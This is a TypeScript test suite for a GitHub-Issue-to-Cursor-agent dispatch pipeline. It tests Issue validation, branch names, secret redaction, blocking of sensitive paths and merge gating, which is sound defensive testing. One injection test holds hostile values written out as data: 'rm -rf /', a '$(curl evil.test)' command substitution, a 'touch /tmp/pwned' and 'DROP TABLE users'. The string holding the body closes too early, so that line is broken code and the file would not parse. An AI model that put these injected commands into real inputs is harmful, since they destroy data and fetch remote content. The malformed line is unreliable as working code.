import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { deterministicAgentId, isValidAgentId } from "./agent-id.ts";
import {
  generateBranchName,
  isCursorBranch,
  slugifyTitle,
  truncateBranchName,
} from "./branch-name.ts";
import {
  buildDispatchFailureComment,
  buildDispatchSuccessComment,
  hasDispatchSuccessMarker,
} from "./comments.ts";
import { CURSOR_API, DIVLAB_REPO, MAX_BRANCH_NAME_LENGTH } from "./config.ts";
import {
  createCursorAgent,
  CursorApiError,
} from "./cursor-client.ts";
import { buildCursorDispatchPayload } from "./cursor-payload.ts";
import { validateIssueDispatchEvent } from "./github-event.ts";
import {
  evaluateChecks,
  evaluateMergeEligibility,
  type PullRequestMergeContext,
} from "./merge-eligibility.ts";
import { isExpectedCursorCreatorFlow } from "./pr-validation.ts";
import { parseRiskClassification } from "./risk.ts";
import { containsSecretLikeValue, sanitizeErrorMessage } from "./sanitize.ts";
import {
  classifyPath,
  findSensitivePaths,
  normalizeRepoPath,
  type SensitiveCategory,
} from "./sensitive-paths.ts";

function baseIssueEvent(overrides: Record<string, unknown> = {}) {
  return {
    action: "labeled",
    label: { name: "cursor-agent" },
    repository: { full_name: DIVLAB_REPO.fullName },
    issue: {
      number: 42,
      title: "Uppdatera nyhetsbild",
      body: "Gör en enkel UI-justering.\n\n### Risk classification\n\nLow — editorial/content/simple UI",
      html_url: `${DIVLAB_REPO.url}/issues/42`,
      user: { login: "Nils-henrik" },
      labels: [{ name: "cursor-agent" }],
    },
    ...overrides,
  };
}

function basePrContext(
  overrides: Partial<PullRequestMergeContext> = {},
): PullRequestMergeContext {
  return {
    repositoryFullName: DIVLAB_REPO.fullName,
    baseBranch: "main",
    headBranch: "cursor/issue-42-uppdatera-nyhetsbild",
    headSha: "abc123def456",
    approvedHeadSha: "abc123def456",
    state: "open",
    draft: false,
    mergeable: true,
    mergeableState: "clean",
    changedFiles: ["app/news/page.tsx", "public/images/cover.webp"],
    risk: "low",
    expectedCreatorFlow: true,
    ...overrides,
  };
}

describe("github event validation", () => {
  it("accepts a valid owner-authored Issue", () => {
    const result = validateIssueDispatchEvent(baseIssueEvent(), {
      requireLabel: "cursor-agent",
    });
    assert.equal(result.ok, true);
    if (result.ok) {
      assert.equal(result.issueNumber, 42);
      assert.equal(result.author, "Nils-henrik");
      assert.match(result.title, /nyhetsbild/i);
    }
  });

  it("rejects an Issue from another user", () => {
    const result = validateIssueDispatchEvent(
      baseIssueEvent({
        issue: {
          number: 7,
          title: "Nope",
          body: "x",
          user: { login: "someone-else" },
          labels: [{ name: "cursor-agent" }],
        },
      }),
    );
    assert.equal(result.ok, false);
    if (!result.ok) {
      assert.equal(result.reason, "unauthorized_author");
    }
  });

  it("rejects a pull request masquerading as an Issue event", () => {
    const result = validateIssueDispatchEvent({
      action: "labeled",
      pull_request: { number: 9 },
      repository: { full_name: DIVLAB_REPO.fullName },
    });
    assert.equal(result.ok, false);
    if (!result.ok) {
      assert.equal(result.reason, "pull_request_masquerading");
    }
  });

  it("rejects Issue objects that reference pull_request", () => {
    const result = validateIssueDispatchEvent(
      baseIssueEvent({
        issue: {
          number: 3,
          title: "PR issue",
          body: "x",
          user: { login: "Nils-henrik" },
          pull_request: { url: "https://example.com" },
          labels: [{ name: "cursor-agent" }],
        },
      }),
    );
    assert.equal(result.ok, false);
    if (!result.ok) {
      assert.equal(result.reason, "pull_request_masquerading");
    }
  });

  it("rejects duplicate dispatch attempts", () => {
    const result = validateIssueDispatchEvent(baseIssueEvent(), {
      alreadyRunning: true,
    });
    assert.equal(result.ok, false);
    if (!result.ok) {
      assert.equal(result.reason, "duplicate_dispatch");
    }
  });

  it("keeps unsafe Issue title/body as data and never executes them", () => {
    const maliciousTitle = '"; rm -rf /; echo "';
    const maliciousBody = "$(curl evil.test) `touch /tmp/pwned`"; DROP TABLE users; --";
    const result = validateIssueDispatchEvent(
      baseIssueEvent({
        issue: {
          number: 99,
          title: maliciousTitle,
          body: maliciousBody,
          user: { login: "Nils-henrik" },
          labels: [{ name: "cursor-agent" }],
        },
      }),
    );
    assert.equal(result.ok, true);
    if (result.ok) {
      assert.equal(result.title, maliciousTitle);
      assert.equal(result.body, maliciousBody);
      const payload = buildCursorDispatchPayload(result);
      // JSON encoding must preserve the strings as data.
      const encoded = JSON.stringify(payload.request);
      assert.ok(encoded.includes(JSON.stringify(maliciousTitle).slice(1, -1)));
      assert.equal(payload.request.repos[0]?.url, DIVLAB_REPO.url);
      // The shell metacharacters are inside JSON strings, not raw shell.
      assert.ok(encoded.startsWith("{"));
      assert.ok(!encoded.includes("\n$(curl"));
    }
  });
});

describe("cursor payload", () => {
  it("contains the correct repository and main ref", () => {
    const built = buildCursorDispatchPayload({
      issueNumber: 12,
      title: "Test",
      body: "### Risk classification\n\nLow — editorial/content/simple UI",
    });
    assert.equal(built.endpoint, `${CURSOR_API.baseUrl}${CURSOR_API.createAgentPath}`);
    assert.equal(built.request.repos[0]?.url, DIVLAB_REPO.url);
    assert.equal(built.request.repos[0]?.startingRef, "main");
    assert.equal(built.request.autoCreatePR, true);
    assert.equal(built.request.workOnCurrentBranch, false);
    assert.ok(built.request.prompt.text.includes("Never merge"));
    assert.ok(isValidAgentId(built.agentId));
  });
});

describe("branch names", () => {
  it("generates deterministic branch names", () => {
    const a = generateBranchName(10, "Fix Cover Image");
    const b = generateBranchName(10, "Fix Cover Image");
    assert.equal(a, b);
    assert.equal(a, "cursor/issue-10-fix-cover-image");
    assert.equal(isCursorBranch(a), true);
  });

  it("handles Unicode and Swedish characters", () => {
    const name = generateBranchName(5, "Uppdatera premiär för öppna fonder");
    assert.ok(name.startsWith("cursor/issue-5-"));
    assert.ok(!/[åäö]/i.test(name));
    assert.ok(slugifyTitle("ÅÄÖ").length > 0);
  });

  it("truncates overly long branch names", () => {
    const long = "a".repeat(300);
    const name = generateBranchName(1, long);
    assert.ok(name.length <= MAX_BRANCH_NAME_LENGTH);
    assert.equal(truncateBranchName("x".repeat(120)).length, MAX_BRANCH_NAME_LENGTH);
  });
});

describe("agent id idempotency", () => {
  it("is stable for the same issue number", () => {
    assert.equal(deterministicAgentId(42), deterministicAgentId(42));
    assert.notEqual(deterministicAgentId(42), deterministicAgentId(43));
    assert.equal(isValidAgentId(deterministicAgentId(1)), true);
  });
});

describe("sanitize", () => {
  it("redacts Authorization headers and token-like strings", () => {
    const raw =
      'Authorization: Bearer sk-abcdefghijklmnopqrstuvwxyz012345 failure ghp_abcdefghijklmnopqrstuvwxyz012345';
    const safe = sanitizeErrorMessage(raw);
    assert.equal(containsSecretLikeValue(safe), false);
    assert.ok(safe.includes("[REDACTED]"));
    assert.ok(!safe.includes("sk-abcdefghijklmnopqrstuvwxyz012345"));
    assert.ok(!safe.includes("ghp_"));
  });

  it("sanitizes API errors for Issue comments", () => {
    const comment = buildDispatchFailureComment({
      issueNumber: 1,
      error: "Authorization: Bearer SUPERSECRETTOKEN12345678 boom",
    });
    assert.ok(!comment.includes("SUPERSECRETTOKEN12345678"));
    assert.ok(comment.includes("[REDACTED]") || !comment.includes("Bearer "));
  });
});

describe("cursor client", () => {
  it("fails when CURSOR_API_KEY is missing", async () => {
    await assert.rejects(
      () =>
        createCursorAgent({
          apiKey: "",
          request: buildCursorDispatchPayload({
            issueNumber: 1,
            title: "t",
            body: "b",
          }).request,
        }),
      (error: unknown) =>
        error instanceof CursorApiError &&
        error.safeMessage.includes("CURSOR_API_KEY"),
    );
  });

  it("sanitizes API failure bodies and never returns secrets", async () => {
    const fetchImpl: typeof fetch = async () =>
      new Response(
        JSON.stringify({
          error: {
            code: "unauthorized",
            message: "Authorization: Bearer leaked-key-value-1234567890",
          },
        }),
        { status: 401, headers: { "Content-Type": "application/json" } },
      );

    await assert.rejects(
      () =>
        createCursorAgent({
          apiKey: "test-key-not-real",
          request: buildCursorDispatchPayload({
            issueNumber: 2,
            title: "t",
            body: "b",
          }).request,
          fetchImpl,
        }),
      (error: unknown) => {
        assert.ok(error instanceof CursorApiError);
        assert.ok(!error.safeMessage.includes("leaked-key-value"));
        assert.ok(!error.safeMessage.includes("test-key-not-real"));
        return true;
      },
    );
  });

  it("parses a successful create-agent response", async () => {
    const fetchImpl: typeof fetch = async () =>
      new Response(
        JSON.stringify({
          agent: {
            id: "bc-00000000-0000-0000-0000-000000000099",
            url: "https://cursor.com/agents/bc-00000000-0000-0000-0000-000000000099",
            status: "ACTIVE",
          },
          run: { id: "run-1" },
        }),
        { status: 200, headers: { "Content-Type": "application/json" } },
      );

    const result = await createCursorAgent({
      apiKey: "test-key-not-real",
      request: buildCursorDispatchPayload({
        issueNumber: 3,
        title: "t",
        body: "b",
      }).request,
      fetchImpl,
    });
    assert.equal(result.agentId, "bc-00000000-0000-0000-0000-000000000099");
    assert.ok(result.agentUrl?.includes("cursor.com/agents/"));
  });
});

describe("comments", () => {
  it("includes required success fields", () => {
    const body = buildDispatchSuccessComment({
      agentId: "bc-1",
      agentUrl: "https://cursor.com/agents/bc-1",
      plannedBranchName: "cursor/issue-9-x",
      issueNumber: 9,
    });
    assert.ok(body.includes("Cursor task started") || body.includes("started"));
    assert.ok(body.includes("bc-1"));
    assert.ok(body.includes("https://cursor.com/agents/bc-1"));
    assert.ok(body.includes("cursor/issue-9-x"));
    assert.ok(body.includes("#9"));
    assert.equal(hasDispatchSuccessMarker(body), true);
  });
});

describe("sensitive path classification", () => {
  it("allows safe editorial paths", () => {
    const paths = [
      "app/news/foo/page.tsx",
      "public/images/cover.webp",
      "docs/project/FEATURES.md",
      "data/news/article.ts",
    ];
    assert.equal(findSensitivePaths(paths).length, 0);
  });

  it("blocks every required sensitive-path category", () => {
    const samples: Record<SensitiveCategory, string> = {
      workflows: ".github/workflows/cursor-agent-dispatch.yml",
      supabase: "supabase/config.toml",
      migrations: "supabase/migrations/20260101010101_init.sql",
      "rls-policies": "supabase/policies/rls_users.sql",
      auth: "lib/auth/session.ts",
      middleware: "middleware.ts",
      proxy: "proxy.ts",
      "next-config": "next.config.ts",
      "package-manifest": "package.json",
      lockfiles: "package-lock.json",
      "env-secrets": ".env.local",
      "credentials-config": "secrets/production.json",
      billing: "lib/billing/stripe.ts",
      "destructive-scripts": "scripts/wipe-users.mjs",
      "account-userdata": "lib/account/delete-account.ts",
      "security-headers": "lib/security/content-security-policy.ts",
    };

    for (const [category, path] of Object.entries(samples)) {
      const match = classifyPath(path);
      assert.ok(match, `expected ${path} to be sensitive`);
      assert.equal(match?.category, category);
    }
  });

  it("cannot be bypassed by path traversal or unusual spelling", () => {
    assert.equal(normalizeRepoPath("../.github/workflows/x.yml"), null);
    assert.equal(
      classifyPath("../.github/workflows/x.yml")?.category,
      "credentials-config",
    );
    assert.equal(
      classifyPath(".github/workflows/../workflows/x.yml")?.category,
      "credentials-config",
    );
    assert.equal(
      classifyPath("lib/auth/../auth/session.ts")?.category,
      "credentials-config",
    );
    assert.equal(classifyPath(".Github/Workflows/ci.yml")?.category, "workflows");
    assert.equal(classifyPath("./package-lock.json")?.category, "lockfiles");
    assert.equal(classifyPath(".env%2Elocal")?.category, "env-secrets");
  });
});

describe("merge eligibility", () => {
  it("allows an eligible non-sensitive Cursor PR", () => {
    const decision = evaluateMergeEligibility(basePrContext(), {
      requiredChecks: [
        { name: "lint", status: "completed", conclusion: "success" },
      ],
      vercelCheck: {
        name: "Vercel",
        status: "completed",
        conclusion: "success",
      },
    });
    assert.equal(decision.allowed, true);
  });

  it("blocks when PR head SHA changes after approval", () => {
    const decision = evaluateMergeEligibility(
      basePrContext({ headSha: "ffffff", approvedHeadSha: "aaaaaa" }),
    );
    assert.equal(decision.allowed, false);
    if (!decision.allowed) {
      assert.equal(decision.reason, "head_sha_changed");
    }
  });

  it("blocks missing or failed checks", () => {
    const missingVercel = evaluateChecks({
      requiredChecks: [
        { name: "lint", status: "completed", conclusion: "success" },
      ],
    });
    assert.equal(missingVercel.allowed, false);

    const failed = evaluateChecks({
      requiredChecks: [
        { name: "lint", status: "completed", conclusion: "failure" },
      ],
      vercelCheck: {
        name: "Vercel",
        status: "completed",
        conclusion: "success",
      },
    });
    assert.equal(failed.allowed, false);

    const pending = evaluateChecks({
      requiredChecks: [
        { name: "lint", status: "in_progress", conclusion: null },
      ],
      vercelCheck: {
        name: "Vercel",
        status: "completed",
        conclusion: "success",
      },
    });
    assert.equal(pending.allowed, false);
  });

  it("blocks high / manual-only / unknown risk", () => {
    for (const risk of ["high", "manual-only", "unknown"] as const) {
      const decision = evaluateMergeEligibility(basePrContext({ risk }));
      assert.equal(decision.allowed, false);
    }
  });

  it("blocks sensitive paths even when approved", () => {
    const decision = evaluateMergeEligibility(
      basePrContext({
        changedFiles: ["package.json", "app/news/page.tsx"],
        risk: "low",
      }),
    );
    assert.equal(decision.allowed, false);
    if (!decision.allowed) {
      assert.equal(decision.reason, "sensitive_paths");
      assert.equal(decision.requireManualReview, true);
    }
  });

  it("parses risk markers from Issue form style bodies", () => {
    assert.equal(
      parseRiskClassification(
        "### Risk classification\n\nHigh — auth/database/security/user data",
      ),
      "high",
    );
    assert.equal(
      parseRiskClassification("<!-- divlab-risk: medium -->"),
      "medium",
    );
    assert.equal(parseRiskClassification("no risk here"), "unknown");
  });

  it("recognizes expected Cursor creator flow", () => {
    assert.equal(
      isExpectedCursorCreatorFlow({
        user: { login: "cursor[bot]", type: "Bot" },
        head: {
          ref: "cursor/issue-1-x",
          repo: { full_name: DIVLAB_REPO.fullName },
        },
        base: { ref: "main", repo: { full_name: DIVLAB_REPO.fullName } },
      }),
      true,
    );
    assert.equal(
      isExpectedCursorCreatorFlow({
        user: { login: "random-fork" },
        head: {
          ref: "cursor/issue-1-x",
          repo: { full_name: "other/fork" },
        },
        base: { ref: "main", repo: { full_name: DIVLAB_REPO.fullName } },
      }),
      false,
    );
  });
});
